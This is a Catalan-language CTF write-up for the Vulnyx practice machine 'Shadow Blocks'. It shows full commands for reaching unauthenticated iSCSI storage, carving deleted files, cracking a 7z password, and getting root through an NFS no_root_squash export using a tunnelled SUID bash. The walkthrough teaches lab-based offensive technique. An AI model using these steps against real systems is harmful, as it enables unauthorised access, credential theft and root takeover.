---
author: Lenam
pubDatetime: 2026-03-04T00:00:00Z
title: WriteUp Shadow Blocks - Vulnyx
urlSlug: shadowblocks-writeup-vulnyx
featured: true
draft: false
ogImage: "../../../assets/images/shadowblocks/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - iSCSI
  - NFS
  - forensics
  - password cracking
  - suid
description:
  "Writeup de la màquina Shadow Blocks (Vulnyx): Explotació d'iSCSI i recuperació de dades en disc per filtrar credencials, i ús de NFS sense protecció per escalar privilegis."
lang: ca
translationId: shadow-blocks-writeup-vulnyx
---

![Shadow Blocks VirtualBox](../../../assets/images/shadowblocks/OpenGraph.png)

Writeup de la màquina **Shadow Blocks** ([Vulnyx](https://vulnyx.com/)): Explotació d'iSCSI i recuperació de dades en disc per filtrar credencials, i ús de NFS sense protecció per escalar privilegis.

## Taula de continguts

## Enumeració

![Shadow Blocks VirtualBox](../../../assets/images/shadowblocks/20260228_030429_image.png)

El primer pas en qualsevol CTF és reconèixer la superfície d'atac. Per això realitzem un escaneig de ports contra la IP objectiu.

```bash
$ nmap -p- -Pn 192.168.1.133                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 18:59 CET
Nmap scan report for 192.168.1.133
Host is up (0.00068s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3260/tcp open  iscsi
MAC Address: 08:00:27:54:16:99 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 108.76 seconds
```

**Explicació de la comanda:**
- `-p-`: Escaneja **tots els ports TCP** (1-65535), no només els habituals. Imprescindible en CTF per no perdre vectors ocults.
- `-Pn`: **Omet el descobriment d'hosts per ping**. Moltes màquines bloquen l'ICMP; amb `-Pn` nmap assumeix que l'host està actiu i va directe a l'escaneig de ports. Sense això, podríem obtenir "Host seems down".
- `192.168.1.133`: IP objectiu de la màquina a la xarxa virtual.

**Resultat:** Dos ports oberts — **22 (SSH)** per accés remot i **3260 (iSCSI)**, protocol d'emmagatzematge en xarxa. El port 3260 és l'estàndard per a iSCSI (Internet Small Computer System Interface).

A continuació refinem l'escaneig sobre aquests ports per obtenir versions i scripts:

```bash
$ nmap -p22,3260 -sVC -Pn -n 192.168.1.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 19:04 CET
Nmap scan report for 192.168.1.133
Host is up (0.00038s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
3260/tcp open  iscsi   Synology DSM iSCSI
| iscsi-info: 
|   iqn.2026-02.nyx.shadowblocks:storage.disk1: 
|     Address: 192.168.1.133:3260,1
|_    Authentication: NOT required
MAC Address: 08:00:27:54:16:99 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.27 seconds

```

**Explicació de la comanda:**
- `-p22,3260`: Escaneja només els ports detectats com a oberts.
- `-sV`: **Detecció de versions** — identifica el programari i la versió (OpenSSH 10.0p2, Synology DSM iSCSI).
- `-sC`: Executa els **scripts per defecte** de nmap; entre ells `iscsi-info`, que consulta els targets iSCSI i revela configuració sensible.
- `-n`: Desactiva la resolució DNS inversa per accelerar.
- `-Pn`: No realitza ping previ.

**Troballa clau:** El script `iscsi-info` descobreix que el target iSCSI **no requereix autenticació** (`Authentication: NOT required`) i exposa l'IQN: `iqn.2026-02.nyx.shadowblocks:storage.disk1`. Qualsevol a la xarxa pot connectar-se al disc.

### Servei iSCSI

iSCSI exposa discs durs via TCP/IP. Els clients es connecten a un "target" identificat per un IQN i poden muntar el disc com a dispositiu de bloc. Amb autenticació deshabilitada, qualsevol pot accedir.

Confirmem i gestionem la connexió amb `iscsiadm`:

```bash
$ sudo iscsiadm -m discovery -t sendtargets -p 192.168.1.133
192.168.1.133:3260,1 iqn.2026-02.nyx.shadowblocks:storage.disk1
```

**Explicació:** `-m discovery` explora els targets disponibles; `-t sendtargets` fa servir el mètode estàndard iSCSI SendTargets; `-p` indica el portal (IP:port). El resultat confirma l'IQN i l'adreça.

Iniciem sessió per associar el disc com a dispositiu local:

```bash
sudo iscsiadm -m node --targetname="iqn.2026-02.nyx.shadowblocks:storage.disk1" -p 192.168.1.133:3260 --login
```

**Explicació:** `-m node` gestiona la sessió amb el target; `--targetname` identifica el disc; `--login` estableix la connexió. El kernel assigna un dispositiu de bloc (normalment el següent disponible després de `/dev/sda`).

Després del login, el disc apareix com a dispositiu local. Amb `fdisk -l` o `lsblk` comprovem:

```bash
$ sudo fdisk -l
Disk /dev/sda: 80,09 GiB, 86000000000 bytes, 167968750 sectors
Disk model: VBOX HARDDISK   
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x6c9b1d52

Device     Boot Start       End Sectors  Size Id Type
/dev/sda1  *     2048 167968749 167966702 80,1G 83 Linux


Disk /dev/sdb: 150 MiB, 157286400 bytes, 307200 sectors
Disk model: shadowblocks  
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 8388608 bytes
Disklabel type: dos
Disk identifier: 0x2566cb3e

Device     Boot Start    End Sectors  Size Id Type
/dev/sdb1        2048 307199  305152  149M 83 Linux

```

Apareix `/dev/sdb` (model "shadowblocks", 150 MiB) amb la partició `/dev/sdb1` (tipus 83 = Linux). Montem i explorem:

```bash
sudo mkdir /mnt/iscsi
sudo mount /dev/sdb1 /mnt/iscsi
find /mnt/iscsi -ls
```

**Explicació:**
- `mkdir /mnt/iscsi`: Punt de muntatge on s'exposarà el sistema de fitxers.
- `mount /dev/sdb1 /mnt/iscsi`: Associa la partició al directori; a partir d'aquí accedim als fitxers visibles al filesystem.
- `find ... -ls`: Llista recursiva de fitxers amb permisos, propietari i mida.

**Important:** Només veiem fitxers que segueixen al sistema de fitxers. Els que van ser esborrats ja no estan a la taula d'inodes, però les seves dades poden seguir en sectors no reassignats. Per això l'enumeració "normal" no revela credencials; cal recórrer a tècniques forenses.

## Filtració de credencials

Els fitxers esborrats no desapareixen a l'instant: el sistema marca els blocs com a lliures, però les dades segueixen al disc fins que es sobreescriuen. Podem recuperar-los mitjançant **file carving** sobre l'espai no assignat o una imatge forense.

**Procés:**

1. **Desmuntar** — Per treballar sobre sectors en brut sense interferència de la caché del kernel.
2. **Crear imatge forense** — Treballar sobre una còpia evita alterar el disc original i compleix bones pràctiques forenses.
3. **Recuperar amb Photorec** — Escaneja sectors buscant capçaleres i peus de fitxer coneguts (signatures) per extreure fitxers tot i que no tinguin entrada al filesystem.

```bash
# Desmuntar per accedir a sectors raw
sudo umount /mnt/iscsi
# Imatge forense: no modifiquem l'original
sudo dd if=/dev/sdb1 of=iscsi.img bs=4M status=progress
# Recuperar fitxers de l'espai alliberat (file carving)
sudo photorec iscsi.img
```

Al Photorec seleccionem el disc
![](../../../assets/images/shadowblocks/20260228_194217_image.png)

tot l'espai del disc
![](../../../assets/images/shadowblocks/20260228_194243_image.png)

el format del disc
![](../../../assets/images/shadowblocks/20260228_194301_image.png)

i després amb la tecla "C" triem on guardar tots els fitxers recuperats.
![](../../../assets/images/shadowblocks/20260228_194327_image.png)

Els fitxers es guarden en carpetes `recup_dir.X/`. Sol haver-hi fitxers de text i arxius 7z. Si intentem descomprimir un 7z ens demanarà contrasenya, així que cal crackejar-la.

### Cracking de fitxers 7z

`7z2john` extreu el hash de la contrasenya del fitxer 7z perquè John the Ripper pugui provar contrasenyes per força bruta o diccionari. Cal fer servir el nom del fitxer 7z correcte (pot variar segons la recuperació).

```bash
7z2john recup_dir.1/f0018434.7z > hash
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

**Explicació:**
- `7z2john fitxer.7z > hash`: Converteix els metadades xifrats del 7z a un format que John entén. El hash inclou el salt i els paràmetres AES; John provarà contrasenyes fins a trobar la correcta.
- `john --wordlist=rockyou.txt ./hash`: Prova cada línia de rockyou.txt com a contrasenya. rockyou.txt és un diccionari habitual de contrasenyes febles/reutilitzades.

Obtenim la contrasenya `donald`.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 6 for all loaded hashes
Cost 3 (compression type) is 0 for all loaded hashes
Cost 4 (data length) is 122 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key to status
donald           (?)     
1g 0:00:00:04 DONE (2026-02-28 19:51) 0.2105g/s 215.5p/s 215.5c/s 215.5C/s marie1..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Descomprimim el 7z amb la contrasenya `donald`. El nom del fitxer pot ser diferent al utilitzat per al hash (p. ex. `f0018448.7z` si conté `credentials.txt`).

```bash
7z e recup_dir.1/f0018448.7z
```

**Explicació:** `7z e` extreu el contingut del fitxer (mode "extract"). Demanarà la contrasenya; en introduir `donald` descomprimirà els fitxers al directori actual.

Dins apareix `credentials.txt`, el fitxer que havia estat esborrat al disc i recuperat pel Photorec.

> **Nota:** La contrasenya s'ha ocultat per no facilitar la resolució de la màquina a qui vulgui practicar-la.

```bash
$ cat credentials.txt 
ShadowBlocks Internal Access Credentials
=======================================

System: Primary Storage Node
Environment: Production
Access Level: Administrative

Username: lenam
Password: ********

Note:
This file is intended for temporary migration procedures only.
It must be deleted after use.
Last reviewed: 2026-02-15
```

Fem servir aquestes credencials per accedir per SSH al servidor (usuari `lenam`, contrasenya del fitxer):

```bash
ssh lenam@192.168.1.133
```

**Motiu:** Les credencials trobades eren per a "migració" i se suposava que estaven esborrades, però seguien en sectors no sobreescrits del disc iSCSI. En connectar-nos obtenim shell d'usuari `lenam` per continuar l'escalada.

## Escalada de privilegis

Amb privilegis de `lenam` revisem els ports locals (`netstat`, `ss`) o executem eines com LinPEAS. Això revela el servei **NFS** (ports 2049, 111 i altres dinàmics) amb una configuració perillosa: `no_root_squash`.

**Nota:** Els ports NFS (2049, 111, etc.) no estaven visibles des de fora en l'escaneig inicial amb nmap; només eren accessibles localment a la màquina víctima. Per això necessitem el túnel SSH per poder muntar l'export des de la nostra Kali.

**Què és `no_root_squash`:** Per defecte NFS "aplasta" l'usuari root del client i l'assigna a `nobody` per seguretat. Amb `no_root_squash` el root del client conserva UID 0 al servidor. Si podem escriure a l'export com a root (des d'una màquina que controlem) i després executar el que hem escrit des de la víctima, podem escalar a root.

Referència: [NFS no_root_squash (HackTricks)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)

Comprovem les exportacions NFS al servidor:

```bash
lenam@shadowblocks:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/nfs *(rw,sync,fsid=0,no_subtree_check,no_root_squash,insecure)
```

**Anàlisi de `/etc/exports`:**
- `/srv/nfs`: Directori exportat.
- `*`: Qualsevol client pot muntar.
- `rw`: Lectura i escriptura.
- `no_root_squash`: **Vulnerable** — el root del client conserva UID 0.
- `insecure`: Permet connexions des de ports >1024 (necessari per al túnel).

### Explotació

NFS sol escoltar només a localhost o a una interfície interna. Si no tenim accés directe, fem un **túnel SSH** per redirigir el port NFS a la nostra màquina:

```bash
ssh -L 2049:127.0.0.1:2049 lenam@192.168.1.133
```

**Explicació del túnel:** `-L 2049:127.0.0.1:2049` redirigeix el port local 2049 de la nostra Kali al port 2049 del localhost de la màquina objectiu. Així, en connectar a `127.0.0.1:2049` des de Kali, el tràfic arriba al NFS del servidor via SSH.

En **una altra terminal**, amb el túnel SSH obert i executant les comandes com a **root** a Kali (necessari perquè NFS interpreti les nostres accions com a UID 0), muntem l'export i copiem un bash amb bit SUID:

```bash
mkdir -p /mnt/nfs
mount -t nfs -o vers=4 127.0.0.1:/ /mnt/nfs
cp /bin/bash /mnt/nfs/bashroot
chmod u+s /mnt/nfs/bashroot
```

**Per què funciona:**
1. `mount ... 127.0.0.1:/`: Montem com a root a la nostra Kali; gràcies al túnel el NFS del servidor rep la petició.
2. `no_root_squash` fa que les nostres operacions com a root al share es reflecteixin com a UID 0 al servidor.
3. `cp /bin/bash` i `chmod u+s`: Copiem el binari i li posem bit SUID. Al servidor el fitxer queda com a propietari **root** amb SUID.
4. En executar `/srv/nfs/bashroot -p` des de `lenam`, el kernel veu el bit SUID i llança el procés com a propietari del fitxer (root). El `-p` evita que bash descarti privilegis en ser invocat amb SUID.

A la sessió SSH com a `lenam`:

```bash
/srv/nfs/bashroot -p
```

S'obté shell amb UID 0 (root).

Podem llegir les flags amb:

```bash
cat /home/lenam/user.txt   # Després d'obtenir accés com a lenam
cat /root/root.txt         # Després d'escalar a root
```

## Conclusions

Shadow Blocks combina diverses tècniques: accés a emmagatzematge iSCSI sense autenticació, recuperació forense de fitxers esborrats, cracking de contrasenyes i explotació de NFS mal configurat. Les credencials "temporals" mai es van eliminar de forma segura (esborrat sense sobreescriptura), i NFS amb `no_root_squash` va permetre escalar d'usuari a root fent servir un binari SUID col·locat via túnel SSH.

**Punts clau:**
- iSCSI sense autenticació exposa discs a tota la xarxa.
- Els fitxers esborrats poden recuperar-se si els sectors no han estat sobreescrits.
- Les contrasenyes febles (diccionari) segueixen sent un vector comú.
- NFS amb `no_root_squash` permet escalar privilegis si un atacant amb accés (en aquest cas, lenam via túnel SSH) pot muntar l'export com a root i col·locar un binari SUID.

## Referències

- [3260 - Pentesting iSCSI - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi)
- [2049 - Pentesting NFS Service - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [iSCSI - Linux man page (open-iscsi)](https://linux.die.net/man/8/iscsiadm)
- [NFS - exports(5) - Linux man page](https://man7.org/linux/man-pages/man5/exports.5.html)
- [dd(1) - Linux man page](https://man7.org/linux/man-pages/man1/dd.1.html)
- [mount.nfs(8) - Linux man page](https://man7.org/linux/man-pages/man8/mount.nfs.8.html)
- [TestDisk / PhotoRec - Documentació oficial](https://www.cgsecurity.org/wiki/PhotoRec)

